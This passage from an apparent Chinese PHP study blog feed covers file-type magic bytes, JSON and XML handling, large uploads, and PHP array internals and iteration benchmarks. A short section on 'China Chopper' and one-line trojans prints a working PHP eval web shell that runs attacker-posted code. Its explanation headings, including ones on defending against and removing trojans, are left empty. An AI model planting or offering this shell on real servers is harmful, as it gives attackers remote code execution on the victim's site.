  &lt;li&gt;文件头标识 (2 bytes)   42 4D
                                       B  M&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;6.PCX&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (1 bytes)   0A&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;7.TIFF&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (2 bytes)   4D 4D 或 49 49&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;8.ICO&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (8 bytes)   00 00 01 00 01 00 20 20&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.CUR&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (8 bytes)   00 00 02 00 01 00 20 20&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10.IFF&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;文件头标识 (4 bytes)   46 4F 52 4D
                                       F   O  R  M&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;11.ANI&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;文件头标识 (4 bytes)   52 49 46 46
                                       R   I    F   F&lt;/p&gt;

    &lt;p&gt;$fp = fopen($file, ‘rb’);
  $bin = fread($fp, 8);
  fclose($fp);
  unpack(“H*”, $bin);&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何利用随机读写函数对打文件进行分割&quot;&gt;如何利用随机读写函数对打文件进行分割？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;php中的xml和json操作要点&quot;&gt;PHP中的XML和JSON操作要点&lt;/h1&gt;

&lt;h2 id=&quot;dom方式解析xml有什么特点&quot;&gt;DOM方式解析xml有什么特点？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;DOM 将 XML 文档作为一个树形结构，而树叶被定义为节点。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;xmlreader和xml-parser如何解析xml文件&quot;&gt;XMLReader和XML Parser如何解析xml文件？&lt;/h2&gt;

&lt;h2 id=&quot;标准的json格式是什么&quot;&gt;标准的JSON格式是什么？&lt;/h2&gt;

&lt;p&gt;JSON建构于两种结构：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;“名称/值”对的集合（A collection of name/value pairs）。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。&lt;/li&gt;
  &lt;li&gt;值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何格式化输出json&quot;&gt;如何格式化输出JSON？&lt;/h2&gt;

&lt;h2 id=&quot;如何让json_encode的结果显示中文&quot;&gt;如何让json_encode的结果显示中文？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;echo json_encode(array('a' =&amp;gt; '中文'), JSON_UNESCAPED_UNICODE);&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;php大文件上传的原理和实现&quot;&gt;PHP大文件上传的原理和实现&lt;/h1&gt;

&lt;h2 id=&quot;有哪些技术可以实现大文件上传&quot;&gt;有哪些技术可以实现大文件上传？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;HTML Form（可含Javascript、Ajax）。&lt;/li&gt;
  &lt;li&gt;RIA技术（Flex、Silverlight、JavaFX等）。&lt;/li&gt;
  &lt;li&gt;插件技术（Acticx、Applet等）。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ajax20有哪些新特性&quot;&gt;Ajax2.0有哪些新特性？&lt;/h2&gt;

&lt;h2 id=&quot;如何用xmlhttprequest实现大文件上传和断点续传&quot;&gt;如何用XMLHttpRequest实现大文件上传和断点续传？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;中国菜刀和一句话木马&quot;&gt;“中国菜刀”和一句话木马&lt;/h1&gt;

&lt;h2 id=&quot;什么是木马如何编写一句话木马&quot;&gt;什么是木马，如何编写一句话木马？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;?php @eval($_POST[value]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;什么是中国菜刀-如何用中国菜刀&quot;&gt;什么是“中国菜刀”, 如何用“中国菜刀”？&lt;/h2&gt;

&lt;h2 id=&quot;如何防范网页木马&quot;&gt;如何防范网页木马？&lt;/h2&gt;

&lt;h2 id=&quot;如何有效的清除木马&quot;&gt;如何有效的清除木马？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-linux-filesystem/&quot;&gt;Linux 文件系统剖析&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2011/12/inode.html&quot;&gt;理解inode&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://oa.gdut.edu.cn/os/multimedia/oscai/chapter6/pages/ch62.htm&quot;&gt;文件逻辑结构&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://get.jobdeer.com/36.get&quot;&gt;PHP取二进制文件头快速判断文件类型&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://information.dlvtc.edu.cn/jpk/information/VB/file/jxkj/6.2.htm&quot;&gt;文件存取操作&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.json.org/json-zh.html&quot;&gt;介绍 JSON&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://wenku.baidu.com/view/352b9b11a21614791711281d.html&quot;&gt;Web上传大文件的三种解决方案&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://dev.w3.org/2006/webapi/FileAPI/#FileReader-interface&quot;&gt;File API&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest&quot;&gt;XMLHttpRequest&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/AJAX&quot;&gt;AJAX&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/FormData&quot;&gt;FormData&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest&quot;&gt;Using XMLHttpRequest&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>深入浅出PHP数组</title>
   <link href="http://yanpeipan.github.io/2014/12/18/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E6%95%B0%E7%BB%84.html"/>
   <updated>2014-12-18T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/18/深入浅出php数组</id>
   <content type="html">
&lt;h1 id=&quot;数组的表达方式&quot;&gt;数组的表达方式&lt;/h1&gt;

&lt;h2 id=&quot;构造数组的几种方法&quot;&gt;构造数组的几种方法&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;可以用 array() 语言结构来新建一个数组。它接受任意数量用逗号分隔的 键（key） =&amp;gt; 值（value）对。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;自 5.4 起可以使用短数组定义语法，用 [] 替代 array()。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;数组key和value的限制条件&quot;&gt;数组key和value的限制条件&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;key 可以是 integer 或者 string。value 可以是任意类型。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;此外 key 会有如下的强制转换：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;包含有合法整型值的字符串会被转换为整型。例如键名 “8” 实际会被储存为 8。但是 “08” 则不会强制转换，因为其不是一个合法的十进制数值。&lt;/li&gt;
  &lt;li&gt;浮点数也会被转换为整型，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。&lt;/li&gt;
  &lt;li&gt;布尔值也会被转换成整型。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。&lt;/li&gt;
  &lt;li&gt;Null 会被转换为空字符串，即键名 null 实际会被储存为 ““。&lt;/li&gt;
  &lt;li&gt;数组和对象不能被用为键名。坚持这么做会导致警告：Illegal offset type。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果在数组定义中多个单元都使用了同一个键名，则只使用了最后一个，之前的都被覆盖了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;php-predefined-interfaces-and-classes-预订义接口&quot;&gt;PHP Predefined Interfaces and Classes 预订义接口&lt;/h2&gt;

&lt;h3 id=&quot;traversable遍历接口&quot;&gt;Traversable（遍历）接口&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;检测一个类是否可以使用 foreach 进行遍历的接口。
无法被单独实现的基本抽象接口。相反它必须由 IteratorAggregate 或 Iterator 接口实现。
这个接口没有任何方法，它的作用仅仅是作为所有可遍历类的基本接口。
PHP 已经提供了一些用于日常任务的迭代器。 详细列表参见 &lt;a href=&quot;http://php.net/manual/zh/spl.iterators.php&quot;&gt;SPL 迭代器&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;iteratoraggregate聚合式迭代器接口&quot;&gt;IteratorAggregate（聚合式迭代器）接口&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;创建外部迭代器的接口。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;iterator迭代器接口&quot;&gt;Iterator（迭代器）接口&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;可在内部迭代自己的外部迭代器或类的接口。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;arrayaccess数组式访问接口&quot;&gt;ArrayAccess（数组式访问）接口&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;提供像访问数组一样访问对象的能力的接口。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;序列化接口&quot;&gt;序列化接口&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;自定义序列化的接口。实现此接口的类将不再支持 __sleep() 和 __wakeup()。不论何时，只要有实例需要被序列化，serialize 方法都将被调用。它将不会调用 __destruct() 或有其他影响，除非程序化地调用此方法。当数据被反序列化时，类将被感知并且调用合适的 unserialize() 方法而不是调用 __construct()。如果需要执行标准的构造器，你应该在这个方法中进行处理。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;closure-类&quot;&gt;Closure 类&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;用于代表 匿名函数 的类.
匿名函数（在 PHP 5.3 中被引入）会产生这个类型的对象。在过去，这个类被认为是一个实现细节，但现在可以依赖它做一些事情。自 PHP 5.4 起，这个类带有一些方法，允许在匿名函数创建后对其进行更多的控制。
除了此处列出的方法，还有一个 __invoke 方法。这是为了与其他实现了 __invoke()魔术方法 的对象保持一致性，但调用匿名函数的过程与它无关。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;实现php数组式访问接口&quot;&gt;实现PHP数组式访问接口&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;class Test implements Iterator{
    private $item = array('a' =&amp;gt; 4, 1, 2, 3);

    public function rewind() {
        reset($this-&amp;gt;item);
    }

    public function current() {
        return current($this-&amp;gt;item);
    }

    public function key() {
        return key($this-&amp;gt;item);
    }

    public function next() {
        return next($this-&amp;gt;item);
    }

    public function valid() {
        return($this-&amp;gt;current() !== false);
    }
 }

 $t = new Test;
 foreach($t as $k =&amp;gt; $v){
     var_dump($k, $v);
 }
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;php目前有哪些预订义数组各是什么用途&quot;&gt;PHP目前有哪些预订义数组，各是什么用途？&lt;/h2&gt;

&lt;h3 id=&quot;globals&quot;&gt;$GLOBALS&lt;/h3&gt;
&lt;p&gt;引用全局作用域中可用的全部变量&lt;/p&gt;

&lt;h3 id=&quot;_server&quot;&gt;$_SERVER&lt;/h3&gt;
&lt;p&gt;$HTTP_SERVER_VARS [已弃用] — 服务器和执行环境信息&lt;br /&gt;
$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在» CGI 1.1 规范中说明，所以应该仔细研究一下。&lt;/p&gt;

&lt;h3 id=&quot;_get&quot;&gt;$_GET&lt;/h3&gt;
&lt;p&gt;$_GET – $HTTP_GET_VARS [已弃用] — HTTP GET 变量&lt;/p&gt;

&lt;h3 id=&quot;_post&quot;&gt;$_POST&lt;/h3&gt;
&lt;p&gt;$_POST – $HTTP_POST_VARS [已弃用] — HTTP POST 变量&lt;/p&gt;

&lt;h3 id=&quot;_files&quot;&gt;$_FILES&lt;/h3&gt;
&lt;p&gt;HTTP 文件上传变量&lt;/p&gt;

&lt;h3 id=&quot;_cookie&quot;&gt;$_COOKIE&lt;/h3&gt;
&lt;p&gt;HTTP Cookies&lt;/p&gt;

&lt;h3 id=&quot;_session&quot;&gt;$_SESSION&lt;/h3&gt;
&lt;p&gt;Session 变量&lt;/p&gt;

&lt;h3 id=&quot;_request&quot;&gt;$_REQUEST&lt;/h3&gt;
&lt;p&gt;默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。&lt;/p&gt;

&lt;h3 id=&quot;_env&quot;&gt;$_ENV&lt;/h3&gt;
&lt;p&gt;$_ENV – $HTTP_ENV_VARS [已弃用] — 环境变量
通过环境方式传递给当前脚本的变量的数组。&lt;/p&gt;

&lt;p&gt;这些变量被从 PHP 解析器的运行环境导入到 PHP 的全局命名空间。很多是由支持 PHP 运行的 Shell 提供的，并且不同的系统很可能运行着不同种类的 Shell，所以不可能有一份确定的列表。请查看你的 Shell 文档来获取定义的环境变量列表。&lt;br /&gt;
其他环境变量包含了 CGI 变量，而不管 PHP 是以服务器模块还是 CGI 处理器的方式运行。&lt;br /&gt;
$HTTP_ENV_VARS 包含相同的信息，但它不是一个超全局变量。 (注意 $HTTP_ENV_VARS 和 $_ENV 是不同的变量，PHP 处理它们的方式不同)&lt;/p&gt;

&lt;h2 id=&quot;_evn是什么如何让_evn有效&quot;&gt;$_EVN是什么，如何让$_EVN有效？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数组类型转换&quot;&gt;数组类型转换&lt;/h1&gt;

&lt;h2 id=&quot;其它数据类型转换为数组有什么规律&quot;&gt;其它数据类型转换为数组有什么规律？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;对于任意 integer，float，string，boolean 和 resource 类型，如果将一个值转换为数组，将得到一个仅有一个元素的数组，其下标为 0，该元素即为此标量的值。换句话说，(array)$scalarValue 与 array($scalarValue) 完全一样。&lt;br /&gt;
如果一个 object 类型转换为 array，则结果为一个数组，其单元为该对象的属性。键名将为成员变量名，不过有几点例外：整数属性不可访问；私有变量前会加上类名作前缀；保护变量前会加上一个 ‘*’ 做前缀。这些前缀的前后都各有一个 NULL 字符。这会导致一些不可预知的行为&lt;br /&gt;
将 NULL 转换为 array 会得到一个空的数组。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;有哪些方法可以实现数组的串行化&quot;&gt;有哪些方法可以实现数组的串行化？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;serialize&lt;/code&gt; &lt;code&gt;unserialize&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;json_encode&lt;/code&gt; &lt;code&gt;json_decode&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;implode&lt;/code&gt; &lt;code&gt;explode&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;CJSON&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数组的遍历&quot;&gt;数组的遍历&lt;/h1&gt;

&lt;h2 id=&quot;遍历数组有多少种方法如何选用这些方法&quot;&gt;遍历数组有多少种方法，如何选用这些方法？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;for&lt;/li&gt;
  &lt;li&gt;foreach&lt;/li&gt;
  &lt;li&gt;list each&lt;/li&gt;
  &lt;li&gt;array_walk&lt;/li&gt;
  &lt;li&gt;array_map&lt;/li&gt;
  &lt;li&gt;end current next pos prev reset&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;array_walk-与-array_map-有什么不同&quot;&gt;&lt;code&gt;array_walk&lt;/code&gt; 与 &lt;code&gt;array_map&lt;/code&gt; 有什么不同？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;array array_map ( callable $callback , array $arr1 [, array $… ] )&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;array_map() 返回一个数组，该数组包含了 arr1 中的所有单元经过 callback 作用过之后的单元。callback 接受的参数数目应该和传递给 array_map() 函数的数组数目一致。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;bool array_walk ( array &amp;amp;$array , callable $funcname [, mixed $userdata = NULL ] )&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;array_walk() 不会受到 array 内部数组指针的影响。array_walk() 会遍历整个数组而不管指针的位置。将用户自定义函数 funcname 应用到 array 数组中的每个单元。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;for-和-foreach-谁更快呢为什么&quot;&gt;&lt;code&gt;for&lt;/code&gt; 和 &lt;code&gt;foreach&lt;/code&gt; 谁更快呢？为什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;有很多关于PHP数组的遍历效率的误解。我打算尽量揭开它的神秘面纱。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;测试分为两个部分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;读：只遍历数组，不修改数组&lt;/li&gt;
  &lt;li&gt;写：遍历数组，并修改数组&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;测试版本：PHP 5.5.9-1ubuntu4.5 (cli) (built: Oct 29 2014 11:59:10)&lt;br /&gt;
测试数组：&lt;code&gt;$array = range(1, 1000000);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;测试读&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$start = microtime(true);
foreach($array as $value){$value;};
printf('%.6f' . PHP_EOL, microtime(true) - $start);

$start = microtime(true);
$count = count($array);
for($i=0;$i&amp;lt;$count;$i++){$array[$i];}
printf('%.6f' . PHP_EOL, microtime(true) - $start);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;常见错误：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;比较两个空循环：&lt;code&gt;foreach($array as $value);&lt;/code&gt; &lt;code&gt;for($i=0;$i&amp;lt;$count;$i++);&lt;/code&gt; &lt;code&gt;for-loop&lt;/code&gt;根本没有遍历数组，因此结果没有多少参考价值。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;for($i=0;$i&amp;lt;count($array);$i++)&lt;/code&gt; PHP每次循环都会重新计算&lt;code&gt;count($array)&lt;/code&gt;的值，虽然时间复杂度为1，但仍会对结果产生影响。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;结果分析：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;foreach&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt; &lt;/th&gt;
      &lt;th&gt;for&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;0.040372&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;0.063877&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;结果分析：
PHP数组内部指针(Bucket *pInternalPointer)指向当前数组元素(Bucket)，当前数组元素保存着指向下一元素的指针(struct bucket *pListNext)，&lt;code&gt;foreach&lt;/code&gt;能用到这个结构快速遍历整个数组。
&lt;code&gt;for-loop&lt;/code&gt;的开销在于哈希算法，以及哈希冲突时遍历整个Bucket（PHP中的哈希表是使用拉链法来解决冲突的，具体点讲就是使用链表来存储哈希到同一个槽位的数据， Zend为了保存数据之间的关系使用了双向列表来链接元素)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;测试写&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$start = microtime(true);
foreach($array as $key =&amp;gt; $value) {
	$array[$key] += 1;
}
printf('%.6f' . PHP_EOL, microtime(true) - $start);

$start = microtime(true);
$count = count($array);
for($i=0;$i&amp;lt;$count;$i++) {
	$array[$i] += 1;
}
printf('%.6f' . PHP_EOL, microtime(true) - $start);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;常见错误：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;只测试读性能，忽略写性能&lt;/li&gt;
  &lt;li&gt;测试写的代码本身有个问题，待会再说&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;结果分析：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;foreach&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt; &lt;/th&gt;
      &lt;th&gt;for&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;0.299544&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td&gt;0.077412&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code&gt;foreach&lt;/code&gt;循环性能下降很快，主要性能消耗在执行变量分离（PHP的COW机制（copy on write 写时复制)，遍历时&lt;code&gt;$value&lt;/code&gt; and &lt;code&gt;$array[$key]&lt;/code&gt;共同指向一个&lt;code&gt;Bucket&lt;/code&gt;, 所以性能损耗很小，但当其中一个值改变时，则需要执行变量分离)&lt;/p&gt;

&lt;p&gt;*这也是测试代码的问题所在，&lt;code&gt;foreach&lt;/code&gt;不仅执行了哈希查找，还进行了变量分离，有个办法可以避免这个问题，但很少人用：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;foreach($array as &amp;amp;$value) {
    $value += 1;
}
unset($value);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;php数组在底实现上是什么数据结构&quot;&gt;PHP数组在底实现上是什么数据结构？&lt;/h2&gt;

&lt;p&gt;PHP中的哈希表实现在Zend/zend_hash.c中， PHP使用如下两个数据结构来实现哈希表，HashTable结构体用于保存整个哈希表需要的基本信息， 而Bucket结构体用于保存具体的数据内容&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;typedef struct _hashtable { 
    uint nTableSize;        // hash Bucket的大小，最小为8，以2x增长。
    uint nTableMask;        // nTableSize-1 ， 索引取值的优化
    uint nNumOfElements;    // hash Bucket中当前存在的元素个数，count()函数会直接返回此值 
    ulong nNextFreeElement; // 下一个数字索引的位置
    Bucket *pInternalPointer;   // 当前遍历的指针（foreach比for快的原因之一）
    Bucket *pListHead;          // 存储数组头元素指针
    Bucket *pListTail;          // 存储数组尾元素指针
    Bucket **arBuckets;         // 存储hash数组
    dtor_func_t pDestructor;    // 在删除元素时执行的回调函数，用于资源的释放
    zend_bool persistent;       //指出了Bucket内存分配的方式。如果persisient为TRUE，则使用操作系统本身的内存分配函数为Bucket分配内存，否则使用PHP的内存分配函数。
    unsigned char nApplyCount; // 标记当前hash Bucket被递归访问的次数（防止多次递归）
    zend_bool bApplyProtection;// 标记当前hash桶允许不允许多次访问，不允许时，最多只能递归3次
#if ZEND_DEBUG
    int inconsistent;
#endif
} HashTable;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;数据容器：槽位&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;typedef struct bucket {
    ulong h;            // 对char *key进行hash后的值，或者是用户指定的数字索引值
    uint nKeyLength;    // hash关键字的长度，如果数组索引为数字，此值为0
    void *pData;        // 指向value，一般是用户数据的副本，如果是指针数据，则指向pDataPtr
    void *pDataPtr;     //如果是指针数据，此值会指向真正的value，同时上面pData会指向此值
    struct bucket *pListNext;   // 整个hash表的下一元素
    struct bucket *pListLast;   // 整个哈希表该元素的上一个元素
    struct bucket *pNext;       // 存放在同一个hash Bucket内的下一个元素
    struct bucket *pLast;       // 同一个哈希bucket的上一个元素
    // 保存当前值所对于的key字符串，这个字段只能定义在最后，实现变长结构体
    char arKey[1];              
} Bucket;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/arrays.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何用指针函数操作php数组&quot;&gt;如何用指针函数操作PHP数组？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;reset($array);
while(list($key, $value) = each($array));

$value = reset($array);
do {
} while($value = next($array));
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用foreach时应该注意什么问题&quot;&gt;使用&lt;code&gt;foreach&lt;/code&gt;时应该注意什么问题？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;foreach 依赖内部数组指针，在循环中修改其值将可能导致意外的行为。&lt;/li&gt;
  &lt;li&gt;当 foreach 开始执行时，数组内部的指针会自动指向第一个单元。这意味着不需要在 foreach 循环之前调用 reset()。&lt;/li&gt;
  &lt;li&gt;数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。建议使用 unset() 来将其销毁。&lt;/li&gt;
  &lt;li&gt;foreach 不支持用“@”来抑制错误信息的能力。&lt;/li&gt;
  &lt;li&gt;foreach 结束循环时， 数组内部指针会指向下一个单元。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;思考会输出什么结果为什么&quot;&gt;思考，会输出什么结果？为什么？&lt;/h3&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$array = array(1,2,3,4);
echo next($array);

foreach ($array as $value) {
  if (!next($array)) reset($array);
}

echo current($array);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$array = array(1,2,3,4);
foreach($array as $key =&amp;gt; $value) {
	$array[$key] = &amp;amp;$value;	
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$array = array(1,2,3,4);
foreach($array as $key =&amp;gt; $value) {
	$value = &amp;amp;$array[$key];	
}
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数组元素查找&quot;&gt;数组元素查找&lt;/h1&gt;

&lt;h2 id=&quot;如何判断数组中key是否存在&quot;&gt;如何判断数组中key是否存在？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code&gt;array_key_exists&lt;/code&gt; 检查给定的键名或索引是否存在于数组中。&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;isset&lt;/code&gt; 检测变量是否设置，并且不是 NULL。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;如何判断数组中值是否存在&quot;&gt;如何判断数组中值是否存在？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code&gt;in_array&lt;/code&gt;  检查数组中是否存在某个值&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;array_search&lt;/code&gt; 在数组中搜索给定的值，如果成功则返回相应的键名&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;array_keys&lt;/code&gt; 返回数组中所有的键名，如果指定了可选参数 search_value，则只返回该值的键名。否则 input 数组中的所有键名都会被返回。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;如何依据数组的key返回值&quot;&gt;如何依据数组的key返回值？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;$array[$key]&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何依据数组的值返回key&quot;&gt;如何依据数组的值返回key？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code&gt;array_flip&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;array_search&lt;/code&gt; 在数组中搜索给定的值，如果成功则返回相应的键名&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;array_keys&lt;/code&gt; 返回数组中所有的键名，如果指定了可选参数 search_value，则只返回该值的键名。否则 input 数组中的所有键名都会被返回。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;如何依据给定值在数组进行模糊查找&quot;&gt;如何依据给定值在数组进行模糊查找？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;$array = array(599 =&amp;gt; 'PHP', 'JAVA');
$search = 'P';
$result = array_filter(array_map(function($value) use ($search) {
		return is_numeric(strpos($value, $search)) ? $value :  false;
}, $array));
&lt;/code&gt;&lt;/pre&gt;

